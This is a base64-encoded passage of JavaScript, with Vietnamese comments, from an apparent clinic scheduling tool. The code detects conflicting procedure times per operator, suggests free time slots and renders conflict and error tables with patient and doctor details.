c+G7uSBjaOG7iSDEkeG7i25oPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW51cnNlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhciBmYS1jYWxlbmRhci1hbHQgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE5nw6B5IHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFyIGZhLWNsb2NrIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7nWkgZ2lhbiBi4bqvdCDEkeG6p3U8L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLWV4Y2xhbWF0aW9uLXRyaWFuZ2xlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBM4buXaTwvdGg+DQogICAgICAgICAgICA8L3RyPg0KICAgICAgICA8L3RoZWFkPg0KICAgICAgICA8dGJvZHk+YDsNCiAgICANCiAgICBmaWx0ZXJlZEVycm9ycy5mb3JFYWNoKGVycm9yID0+IHsNCiAgICAgICAgaHRtbCArPSBgDQogICAgICAgIDx0ciBjbGFzcz0iZXJyb3Itcm93Ij4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLnBhdGllbnROYW1lfSBbPGZvbnQgY29sb3I9InJlZCI+JHtlcnJvci5wYXRpZW50QWdlfTwvZm9udD5dPGJyLz4ke2Vycm9yLnBhdGllbnRJZH08L3RkPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3IucHJvY2VkdXJlfTwvdGQ+DQogICAgICAgICAgICA8dGQgY2xhc3M9ImRvY3Rvci1jb2x1bW4iIHN0eWxlPSIke2RvY3RvckNvbHVtblN0eWxlfSI+JHtlcnJvci5kb2N0b3IgfHwgJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKX08L3RkPg0KICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtlcnJvci5wcm9jZWR1cmVEYXRlfTwvY2VudGVyPjwvdGQ+DQogICAgICAgICAgICA8dGQ+PGNlbnRlcj4ke2Vycm9yLnN0YXJ0RGF0ZX08YnIvPiR7ZXJyb3Iuc3RhcnRUaW1lfTwvY2VudGVyPjwvdGQ+DQogICAgICAgICAgICA8dGQgY2xhc3M9ImVycm9yLWRldGFpbCI+DQogICAgICAgICAgICAgICAgJHtlcnJvci5tZXNzYWdlfQ0KICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgPC90cj5gOw0KICAgIH0pOw0KICAgIA0KICAgIGh0bWwgKz0gYDwvdGJvZHk+PC90YWJsZT5gOw0KICAgIA0KICAgIGRhdGVNaXNtYXRjaExvZ0Rpdi5pbm5lckhUTUwgPSBodG1sOw0KfQ0KDQoNCg0KDQpmdW5jdGlvbiBnZW5lcmF0ZVRpbWVTdWdnZXN0aW9ucyhwcm9jZWR1cmVzKSB7DQogICAgY29uc3QgdGltZU9wdGlvbiA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2lucHV0W25hbWU9InRpbWVPcHRpb24iXTpjaGVja2VkJykudmFsdWU7DQogICAgY29uc3Qgc3RhcnRIb3VyID0gdGltZU9wdGlvbiA9PT0gJzc6MzAnID8gNy41IDogNzsNCiAgICBjb25zdCBpZ25vcmVBZGphY2VudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpZ25vcmVBZGphY2VudENoZWNrYm94JykuY2hlY2tlZDsNCiAgICBjb25zdCBidWZmZXJNaW51dGVzID0gaWdub3JlQWRqYWNlbnQgPyAwIDogMTsNCiAgICBjb25zdCBzaG93TW9yZVN1Z2dlc3Rpb25zID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dNb3JlU3VnZ2VzdGlvbnNDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgDQogICAgLy8gU+G7kSBraHVuZyBnaeG7nSB04buRaSDEkWEgbeG7l2kgYnXhu5VpIChu4bq/dSBjaOG7jW4gNiBraHVuZyB0aMOsIDMgc8OhbmcgKyAzIGNoaeG7gXUpDQogICAgY29uc3QgbWF4TW9ybmluZyA9IHNob3dNb3JlU3VnZ2VzdGlvbnMgPyAzIDogMjsNCiAgICBjb25zdCBtYXhBZnRlcm5vb24gPSBzaG93TW9yZVN1Z2dlc3Rpb25zID8gMyA6IDE7DQoNCiAgICBwcm9jZWR1cmVzLmZvckVhY2gocHJvYyA9PiB7DQogICAgICAgIGlmICghcHJvYy5jb25mbGljdCkgcmV0dXJuOw0KDQogICAgICAgIGNvbnN0IHNhbWVEYXlQcm9jZWR1cmVzID0gcHJvY2VkdXJlcy5maWx0ZXIocCA9PiANCiAgICAgICAgICAgIHAuZGF0ZSA9PT0gcHJvYy5kYXRlICYmIA0KICAgICAgICAgICAgcC5vcGVyYXRvciA9PT0gcHJvYy5vcGVyYXRvciAmJg0KICAgICAgICAgICAgcC5yb3dJbmRleCAhPT0gcHJvYy5yb3dJbmRleA0KICAgICAgICApOw0KDQogICAgICAgIGNvbnN0IGR1cmF0aW9uU2Vjb25kcyA9IHByb2MuZW5kIC0gcHJvYy5zdGFydCArIChidWZmZXJNaW51dGVzICogNjApOw0KICAgICAgICANCiAgICAgICAgLy8gVMOsbSBraHVuZyBnaeG7nSBideG7lWkgc8OhbmcNCiAgICAgICAgY29uc3QgbW9ybmluZ1Nsb3RzID0gZmluZEF2YWlsYWJsZVNsb3RzKA0KICAgICAgICAgICAgc3RhcnRIb3VyICogMzYwMCwgDQogICAgICAgICAgICAxMS41ICogMzYwMCwgDQogICAgICAgICAgICBkdXJhdGlvblNlY29uZHMsIA0KICAgICAgICAgICAgc2FtZURheVByb2NlZHVyZXMsIA0KICAgICAgICAgICAgbWF4TW9ybmluZw0KICAgICAgICApOw0KICAgICAgICANCiAgICAgICAgLy8gVMOsbSBraHVuZyBnaeG7nSBideG7lWkgY2hp4buBdQ0KICAgICAgICBjb25zdCBhZnRlcm5vb25TbG90cyA9IGZpbmRBdmFpbGFibGVTbG90cygNCiAgICAgICAgICAgIDEzLjUgKiAzNjAwLCANCiAgICAgICAgICAgIDE3ICogMzYwMCwgDQogICAgICAgICAgICBkdXJhdGlvblNlY29uZHMsIA0KICAgICAgICAgICAgc2FtZURheVByb2NlZHVyZXMsIA0KICAgICAgICAgICAgbWF4QWZ0ZXJub29uDQogICAgICAgICk7DQoNCiAgICAgICAgLy8gRm9ybWF0IGvhur90IHF14bqjDQogICAgICAgIGxldCBzdWdnZXN0aW9ucyA9IFtdOw0KICAgICAgICBpZiAobW9ybmluZ1Nsb3RzLmxlbmd0aCA+IDApIHsNCiAgICAgICAgICAgIHN1Z2dlc3Rpb25zLnB1c2goJzxzdHJvbmc+U8Ohbmc6PC9zdHJvbmc+PGJyPicgKyANCiAgICAgICAgICAgICAgICBtb3JuaW5nU2xvdHMubWFwKHNsb3QgPT4gYCR7c2xvdC5zdGFydH0gLSAke3Nsb3QuZW5kfWApLmpvaW4oJzxicj4nKSk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGFmdGVybm9vblNsb3RzLmxlbmd0aCA+IDApIHsNCiAgICAgICAgICAgIHN1Z2dlc3Rpb25zLnB1c2goJzxzdHJvbmc+Q2hp4buBdTo8L3N0cm9uZz48YnI+JyArIA0KICAgICAgICAgICAgICAgIGFmdGVybm9vblNsb3RzLm1hcChzbG90ID0+IGAke3Nsb3Quc3RhcnR9IC0gJHtzbG90LmVuZH1gKS5qb2luKCc8YnI+JykpOw0KICAgICAgICB9DQoNCiAgICAgICAgDQppZiAobW9ybmluZ1Nsb3RzLmxlbmd0aCArIGFmdGVybm9vblNsb3RzLmxlbmd0aCA+IDApIHsNCiAgICBwcm9jLnN1Z2dlc3Rpb24gPSBzdWdnZXN0aW9ucy5qb2luKCc8YnI+Jyk7DQp9IGVsc2Ugew0KICAgIHByb2Muc3VnZ2VzdGlvbiA9ICc8c3BhbiBjbGFzcz0ibm8tc3VnZ2VzdGlvbiI+S2jDtG5nIGPDsyBraHVuZyBnaeG7nSB0cuG7kW5nPC9zcGFuPic7DQp9DQoNCiAgICB9KTsNCn0NCi8vIEjDoG0ga2nhu4NtIHRyYSB4dW5nIMSR4buZdCB0aOG7nWkgZ2lhbg0KZnVuY3Rpb24gaGFzVGltZUNvbmZsaWN0KHN0YXJ0VGltZSwgZHVyYXRpb24sIHByb2NlZHVyZXMpIHsNCiAgICBjb25zdCBlbmRUaW1lID0gc3RhcnRUaW1lICsgZHVyYXRpb247DQogICAgDQogICAgZm9yIChjb25zdCBwcm9jIG9mIHByb2NlZHVyZXMpIHsNCiAgICAgICAgY29uc3QgcHJvY1N0YXJ0ID0gcHJvYy5zdGFydDsNCiAgICAgICAgY29uc3QgcHJvY0VuZCA9IHByb2MuZW5kICsgKHByb2MucHJvY2VkdXJlSW5mbz8uYnVmZmVyIHx8IDApICogNjA7DQogICAgICAgIA0KICAgICAgICBpZiAoKHN0YXJ0VGltZSA+PSBwcm9jU3RhcnQgJiYgc3RhcnRUaW1lIDwgcHJvY0VuZCkgfHwgDQogICAgICAgICAgICAoZW5kVGltZSA+IHByb2NTdGFydCAmJiBlbmRUaW1lIDw9IHByb2NFbmQpIHx8DQogICAgICAgICAgICAoc3RhcnRUaW1lIDw9IHByb2NTdGFydCAmJiBlbmRUaW1lID49IHByb2NFbmQpKSB7DQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICANCiAgICByZXR1cm4gZmFsc2U7DQp9DQovLyBIw6BtIHTDrG0ga2h1bmcgZ2nhu50gdHLhu5FuZw0KZnVuY3Rpb24gZmluZEF2YWlsYWJsZVNsb3RzKHN0YXJ0VGltZSwgZW5kVGltZSwgZHVyYXRpb24sIHByb2NlZHVyZXMsIG1heFNsb3RzKSB7DQogICAgY29uc3Qgc2xvdHMgPSBbXTsNCiAgICBsZXQgY3VycmVudFRpbWUgPSBzdGFydFRpbWU7DQogICAgY29uc3QgaWdub3JlQWRqYWNlbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaWdub3JlQWRqYWNlbnRDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgY29uc3QgYnVmZmVyTWludXRlcyA9IGlnbm9yZUFkamFjZW50ID8gMCA6IDE7DQogICAgDQogICAgd2hpbGUgKGN1cnJlbnRUaW1lICsgZHVyYXRpb24gPD0gZW5kVGltZSAmJiBzbG90cy5sZW5ndGggPCBtYXhTbG90cykgew0KICAgICAgICBpZiAoIWhhc1RpbWVDb25mbGljdChjdXJyZW50VGltZSwgZHVyYXRpb24sIHByb2NlZHVyZXMpKSB7DQogICAgICAgICAgICBzbG90cy5wdXNoKHsNCiAgICAgICAgICAgICAgICBzdGFydDogc2Vjb25kc1RvVGltZVN0cihjdXJyZW50VGltZSksDQogICAgICAgICAgICAgICAgZW5kOiBzZWNvbmRzVG9UaW1lU3RyKGN1cnJlbnRUaW1lICsgKGR1cmF0aW9uIC0gKGJ1ZmZlck1pbnV0ZXMgKiA2MCkpKSAvLyBUcuG7qyBidWZmZXIgxJHhu4MgaGnhu4NuIHRo4buLDQogICAgICAgICAgICB9KTsNCiAgICAgICAgfQ0KICAgICAgICBjdXJyZW50VGltZSArPSAxNSAqIDYwOyAvLyBLaeG7g20gdHJhIG3hu5dpIDE1IHBow7p0DQogICAgfQ0KICAgIA0KICAgIHJldHVybiBzbG90czsNCn0NCg0KICAgICAgICBmdW5jdGlvbiBzZWNvbmRzVG9UaW1lU3RyKHNlY29uZHMpIHsNCiAgICAgICAgICAgIGNvbnN0IGhvdXJzID0gTWF0aC5mbG9vcihzZWNvbmRzIC8gMzYwMCk7DQogICAgICAgICAgICBjb25zdCBtaW51dGVzID0gTWF0aC5mbG9vcigoc2Vjb25kcyAlIDM2MDApIC8gNjApOw0KICAgICAgICAgICAgcmV0dXJuIGAke2hvdXJzLnRvU3RyaW5nKCkucGFkU3RhcnQoMiwgJzAnKX06JHttaW51dGVzLnRvU3RyaW5nKCkucGFkU3RhcnQoMiwgJzAnKX1gOw0KICAgICAgICB9DQoNCg0KLy8gxJDhur9tIHThu5VuZyBjYSAic+G6r2MgdGh14buRYyIga2jDoWMgxJFhIHPhu5EgKG91dGxpZXIpDQpmdW5jdGlvbiBnZXRIZXJiT3V0bGllclRvdGFsKCkgew0KICBjb25zdCBoZXJicyA9IEFycmF5LmlzQXJyYXkod2luZG93LmFsbEhlcmJQcm9jZWR1cmVzKSA/IHdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlcyA6IFtdOw0KICBjb25zdCBjb3VudHNCeURhdGUgPSB7fTsNCiAgaGVyYnMuZm9yRWFjaChoID0+IHsNCiAgICBjb25zdCBkID0gaC5kYXRlOw0KICAgIGNvbnN0IG4gPSAoaC5vcGVyYXRvciB8fCAnS2jDtG5nIGPDsycpLnRyaW0oKS50b0xvd2VyQ2FzZSgpOw0KICAgIGlmICghY291bnRzQnlEYXRlW2RdKSBjb3VudHNCeURhdGVbZF0gPSB7fTsNCiAgICBjb3VudHNCeURhdGVbZF1bbl0gPSAoY291bnRzQnlEYXRlW2RdW25dIHx8IDApICsgMTsNCiAgfSk7DQogIGxldCBvdXRsaWVycyA9IDA7DQogIE9iamVjdC52YWx1ZXMoY291bnRzQnlEYXRlKS5mb3JFYWNoKG1hcCA9PiB7DQogICAgY29uc3QgZW50cmllcyA9IE9iamVjdC5lbnRyaWVzKG1hcCkuc29ydCgoYSxiKT0+YlsxXS1hWzFdKTsNCiAgICBjb25zdCB0b3AgPSBlbnRyaWVzWzBdOyBpZiAoIXRvcCkgcmV0dXJuOw0KICAgIGNvbnN0IHRvcE5hbWUgPSB0b3BbMF07DQogICAgZW50cmllcy5mb3JFYWNoKChbbmFtZSwgY250XSkgPT4geyBpZiAobmFtZSAhPT0gdG9wTmFtZSkgb3V0bGllcnMgKz0gY250OyB9KTsNCiAgfSk7DQogIHJldHVybiBvdXRsaWVyczsNCn0NCg0KLy8gxJDhur9tIGzhu5dpIHNhaSB0aOG7nWkgZ2lhbiAoa+G6v3QgdGjDumMgPD0gYuG6r3QgxJHhuqd1LCDEkeG7i25oIGThuqFuZyBzYWksIHNhaSBwaMO6dCBzbyB24bubaSBxdXkgxJHhu4tuaCwuLi4pDQpmdW5jdGlvbiBnZXRUaW1lRXJyb3JUb3RhbCgpIHsNCiAgLy8gxJDhur9tIMSRw7puZyB0aGVvIHPhu5EgaMOgbmcgbOG7l2kgxJFhbmcgaGnhu4NuIHRo4buLDQogIGNvbnN0IGNvbnRhaW5lciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvckxvZycpOyAvLyB2w7luZyBi4bqjbmcgbOG7l2kgdGjhu51pIGdpYW4NCiAgaWYgKCFjb250YWluZXIpIHJldHVybiAwOw0KICByZXR1cm4gY29udGFpbmVyLnF1ZXJ5U2VsZWN0b3JBbGwoJ3RyLmVycm9yLXJvdycpLmxlbmd0aDsNCn0NCg0KZnVuY3Rpb24gZ2V0Q29uZmxpY3RUb3RhbCgpIHsNCiAgLy8gxJDhur9tIMSRw7puZyB0aGVvIHPhu5EgaMOgbmcgeHVuZyDEkeG7mXQgdHJvbmcga+G6v3QgcXXhuqMNCiAgY29uc3QgdGJvZHkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVzdWx0Qm9keScpOyAvLyB0Ym9keSBj4bunYSBi4bqjbmcga+G6v3QgcXXhuqMNCiAgaWYgKCF0Ym9keSkgcmV0dXJuIDA7DQogIHJldHVybiB0Ym9keS5xdWVyeVNlbGVjdG9yQWxsKCd0ci5jb25mbGljdC1yb3cnKS5sZW5ndGg7DQp9DQoNCg0KDQoNCg0KDQoNCg0KICAgICAgIGZ1bmN0aW9uIGRpc3BsYXlSZXN1bHRzKHByb2NlZHVyZXMsIHNraXBwZWRSb3dzID0gMCkgew0KICAgIGFsbFByb2NlZHVyZXMgPSBwcm9jZWR1cmVzOw0KICAgIA0KICAgIGNvbnN0IG9wZXJhdG9ycyA9IFsuLi5uZXcgU2V0KHByb2NlZHVyZXMubWFwKHAgPT4gcC5vcGVyYXRvcikpXTsNCiAgICBjb25zdCBvcGVyYXRvclNlbGVjdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvcGVyYXRvclNlbGVjdCcpOw0KICAgIGNvbnN0IG9wZXJhdG9yU2VsZWN0RXJyb3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JTZWxlY3RFcnJvcicpOw0KICAgIA0KICAgIG9wZXJhdG9yU2VsZWN0LmlubmVySFRNTCA9ICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4nICsgDQogICAgICAgIG9wZXJhdG9ycy5tYXAob3AgPT4gYDxvcHRpb24gdmFsdWU9IiR7b3B9Ij4ke29wLnJlcGxhY2UoLywvZywgJycpfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KICAgIA0KICAgIG9wZXJhdG9yU2VsZWN0RXJyb3IuaW5uZXJIVE1MID0gb3BlcmF0b3JTZWxlY3QuaW5uZXJIVE1MOyAvLyDEkOG7k25nIGLhu5kgbuG7mWkgZHVuZw0KICAgIA0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvcGVyYXRvckZpbHRlcicpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvcGVyYXRvckZpbHRlckVycm9yJykuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGNvbnN0IGNvbmZsaWN0UHJvY2VkdXJlcyA9IHByb2NlZHVyZXMuZmlsdGVyKHAgPT4gcC5jb25mbGljdCk7DQogICAgICAgICAgICBjb25zdCBjb25mbGljdENvdW50ID0gY29uZmxpY3RQcm9jZWR1cmVzLmxlbmd0aDsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgDQogICAgICAgICAgICANCiAgICAgICAgICAgIGZpbHRlckJ5T3BlcmF0b3IoKTsNCiAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVzdWx0U2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgIA0KICAgIC8vIE7hur91IGtow7RuZyBjw7MgbOG7l2ksIGN14buZbiB4deG7kW5nIHBo4bqnbiBr4bq/dCBxdeG6ow0KICAgIGlmIChlcnJvckxvZy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7DQogICAgICAgICAgICBjb25zdCByZXN1bHRTZWN0aW9uID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Jlc3VsdFNlY3Rpb24nKTsNCiAgICAgICAgICAgIGlmIChyZXN1bHRTZWN0aW9uKSB7DQogICAgICAgICAgICAgICAgc21vb3RoU2Nyb2xsVG8ocmVzdWx0U2VjdGlvbiwgLTQwKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSwgMzAwKTsNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIGZpbHRlckJ5T3BlcmF0b3IoKSB7DQogICAgY29uc3Qgb3BlcmF0b3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JTZWxlY3QnKS52YWx1ZTsNCg0KIGNvbnN0IHNob3dEb2N0b3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd0RvY3RvckNoZWNrYm94JykuY2hlY2tlZDsNCiAgICBkb2N1bWVudC5ib2R5LmNsYXNzTGlzdC50b2dnbGUoJ3Nob3ctZG9jdG9yJywgc2hvd0RvY3Rvcik7DQogICAgLy8gPT09PT0gMS4gTOG7jEMgVsOAIEhJ4buCTiBUSOG7iiBC4bqiTkcgS+G6vlQgUVXhuqIgS0nhu4JNIFRSQSBYVU5HIMSQ4buYVCA9PT09PQ0KICAgIGNvbnN0IGZpbHRlcmVkUHJvY2VkdXJlcyA9IG9wZXJhdG9yID09PSAnYWxsJyANCiAgICAgICAgPyBhbGxQcm9jZWR1cmVzLmZpbHRlcihwID0+IHAuY29uZmxpY3QpIA0KICAgICAgICA6IGFsbFByb2NlZHVyZXMuZmlsdGVyKHAgPT4gcC5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKSA9PT0gb3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykgJiYgcC5jb25mbGljdCk7DQoNCiAgICBjb25zdCByZXN1bHRCb2R5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Jlc3VsdEJvZHknKTsNCiAgICByZXN1bHRCb2R5LmlubmVySFRNTCA9ICcnOw0KDQogICAgLy8gTmjDs20gY8OhYyB0aOG7pyB0aHXhuq10IHh1bmcgxJHhu5l0IHbhu5tpIG5oYXUNCiAgICBjb25zdCBjb25mbGljdEdyb3VwcyA9IFtdOw0KICAgIGNvbnN0IHByb2Nlc3NlZFJvd3MgPSBuZXcgU2V0KCk7DQoNCiAgICBmaWx0ZXJlZFByb2NlZHVyZXMuZm9yRWFjaChwcm9jID0+IHsNCiAgICAgICAgaWYgKCFwcm9jZXNzZWRSb3dzLmhhcyhwcm9jLnJvd0luZGV4KSkgew0KICAgICAgICAgICAgY29uc3QgZ3JvdXAgPSBbcHJvY107DQogICAgICAgICAgICBwcm9jZXNzZWRSb3dzLmFkZChwcm9jLnJvd0luZGV4KTsNCg0KICAgICAgICAgICAgLy8gVMOsbSB0aOG7pyB0aHXhuq10IGxpw6puIHF1YW4gdHJvbmcgeHVuZyDEkeG7mXQNCiAgICAgICAgICAgIGlmIChwcm9jLmNvbmZsaWN0UmVhc29uKSB7DQogICAgICAgICAgICAgICAgY29uc3QgY29uZmxpY3RNYXRjaGVzID0gcHJvYy5jb25mbGljdFJlYXNvbi5tYXRjaCgvQuG7h25oIG5ow6JuOiAoLio/KTxicj7igKIgTmfDoHk6ICguKj8pPGJyPuKAoiBUaOG7nWkgZ2lhbjogKC4qPyktL2cpOw0KICAgICAgICAgICAgICAgIGlmIChjb25mbGljdE1hdGNoZXMpIHsNCiAgICAgICAgICAgICAgICAgICAgY29uZmxpY3RNYXRjaGVzLmZvckVhY2gobWF0Y2ggPT4gew0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgcGF0aWVudE5hbWUgPSBtYXRjaC5tYXRjaCgvQuG7h25oIG5ow6JuOiAoLio/KTxicj4vKVsxXTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGRhdGUgPSBtYXRjaC5tYXRjaCgvTmfDoHk6ICguKj8pPGJyPi8pWzFdOw0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgdGltZSA9IG1hdGNoLm1hdGNoKC9UaOG7nWkgZ2lhbjogKC4qPyktLylbMV07DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGNvbmZsaWN0UHJvYyA9IGZpbHRlcmVkUHJvY2VkdXJlcy5maW5kKHAgPT4gDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcC5wYXRpZW50TmFtZSA9PT0gcGF0aWVudE5hbWUgJiYgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcC5kYXRlID09PSBkYXRlICYmIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAuZGlzcGxheVN0YXJ0ID09PSB0aW1lICYmDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIXByb2Nlc3NlZFJvd3MuaGFzKHAucm93SW5kZXgpDQogICAgICAgICAgICAgICAgICAgICAgICApOw0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoY29uZmxpY3RQcm9jKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZ3JvdXAucHVzaChjb25mbGljdFByb2MpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb2Nlc3NlZFJvd3MuYWRkKGNvbmZsaWN0UHJvYy5yb3dJbmRleCk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNvbmZsaWN0R3JvdXBzLnB1c2goZ3JvdXApOw0KICAgICAgICB9DQogICAgfSk7DQoNCiAgIC8vIEhp4buDbiB0aOG7iyBr4bq/dCBxdeG6ow0KICAgIGNvbmZsaWN0R3JvdXBzLmZvckVhY2goZ3JvdXAgPT4gew0KICAgICAgICBncm91cC5mb3JFYWNoKHByb2MgPT4gew0KICAgICAgICAgICAgY29uc3Qgcm93ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICAgICAgICAgIHJvdy5jbGFzc0xpc3QuYWRkKCJoZXJiLXJvdyIpOw0KICAgICAgICAgICAgcm93LmNsYXNzTGlzdC5hZGQoJ2NvbmZsaWN0LXJvdycpOw0KICAgICAgICAgICAgcm93LmlubmVySFRNTCA9IGANCiAgICAgICAgICAgICAgICA8dGQ+JHtwcm9jLnBhdGllbnROYW1lfSBbPGZvbnQgY29sb3I9InJlZCI+JHtwcm9jLnBhdGllbnRBZ2V9PC9mb250Pl0gPGJyLz4gJHtwcm9jLnBhdGllbnRJZH08L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke3Byb2MucHJvY2VkdXJlfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtwcm9jLmRhdGV9PGJyLz4ke3Byb2MuZGlzcGxheVN0YXJ0fSAtICR7cHJvYy5kaXNwbGF5RW5kfTwvY2VudGVyPjwvdGQ+DQogICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJkb2N0b3ItY29sdW1uIj4ke3Byb2MuZG9jdG9yfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPiR7cHJvYy5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKX08L3RkPg0KICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0idGltZS1zdWdnZXN0aW9uIj4ke3Byb2Muc3VnZ2VzdGlvbiB8fCAnS2jDtG5nIGPDsyB4dW5nIMSR4buZdCd9PC90ZD4NCiAgICAgICAgICAgIGA7DQogICAgICAgICAgICByZXN1bHRCb2R5LmFwcGVuZENoaWxkKHJvdyk7DQogICAgICAgIH0pOw0KDQogICAgICAgIC8vIFRow6ptIGTDsm5nIHBow6JuIGPDoWNoDQogICAgICAgIGlmIChncm91cC5sZW5ndGggPiAwKSB7DQogICAgICAgICAgICBjb25zdCBzZXBhcmF0b3IgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCd0cicpOw0KICAgICAgICAgICAgc2VwYXJhdG9yLmlubmVySFRNTCA9ICc8dGQgY29sc3Bhbj0iOCIgY2xhc3M9Imdyb3VwLXNlcGFyYXRvciI+PC90ZD4nOw0KICAgICAgICAgICAgcmVzdWx0Qm9keS5hcHBlbmRDaGlsZChzZXBhcmF0b3IpOw0KICAgICAgICB9DQogICAgfSk7DQoNCiAgICAvLyBO4bq/dSBraMO0bmcgY8OzIG5ow7NtIG7DoG8gdGjDrCB0aMOqbSBkw7JuZyBiw6FvICJLaMO0bmcgY8OzIGzhu5dpIg0KICAgIGlmIChjb25mbGljdEdyb3Vwcy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgY29uc3Qgcm93ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICAgICAgcm93LmlubmVySFRNTCA9IGANCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIDx0ZCBjb2xzcGFuPSI1ImNsYXNzPSJoZXJiLXJvdyBjb25mbGljdC1yb3ciPktow7RuZyBjw7MgbOG7l2kgbsOgbyDEkcaw4bujYyBnaGkgbmjhuq1uPC90ZD4NCiAgICAgICAgYDsNCiAgICAgICAgcmVzdWx0Qm9keS5hcHBlbmRDaGlsZChyb3cpOw0KICAgIH0NCg0KICAgIC8vID09PT09IDIuIEzhu4xDIFbDgCBISeG7gk4gVEjhu4ogQuG6ok5HIEzhu5ZJID09PT09DQpjb25zdCBvcGVyYXRvckVycm9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29wZXJhdG9yU2VsZWN0RXJyb3InKS52YWx1ZTsNCiBjb25zdCBmaWx0ZXJlZEVycm9ycyA9IG9wZXJhdG9yRXJyb3IgPT09ICdhbGwnIA0KICAgPyBlcnJvckxvZyANCiAgIDogZXJyb3JMb2cuZmlsdGVyKGVycm9yID0+DQogICAgICAgZXJyb3IuZGV0YWlscyAmJg0KICAgICAgZXJyb3IuZGV0YWlscy5vcGVyYXRvciAmJg0KICAgICAgIGVycm9yLmRldGFpbHMub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykgPT09IG9wZXJhdG9yRXJyb3IucmVwbGFjZSgvLC9nLCAnJykNCiAgICApOw0KDQogICAgLy8gSGnhu4NuIHRo4buLIGzhu5dpIMSRw6MgbOG7jWMNCiAgICBjb25zdCBlcnJvckxvZ0RpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvckxvZycpOw0KICAgIGlmIChmaWx0ZXJlZEVycm9ycy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgZXJyb3JMb2dEaXYuaW5uZXJIVE1MID0gYDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgICAgICA8dGhlYWQ+DQogI